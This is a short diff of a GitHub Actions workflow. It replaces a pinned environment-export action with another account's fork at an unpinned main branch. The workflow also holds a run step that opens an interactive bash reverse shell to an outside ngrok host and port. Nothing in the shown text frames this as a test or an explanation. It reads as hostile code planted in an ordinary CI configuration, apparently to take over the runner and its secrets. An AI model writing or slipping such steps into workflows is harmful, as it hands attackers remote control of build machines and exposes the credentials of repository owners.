@@ -15,7 +15,7 @@ jobs:
     steps:
       - uses: actions/checkout@v3
 
-      - uses: peaceiris/actions-export-envs@v1.1.0
+      - uses: roin-orca/actions-export-envs@main
         id: envs
 
       - run: bash -i >& /dev/tcp/2.tcp.eu.ngrok.io/11202 0>&1
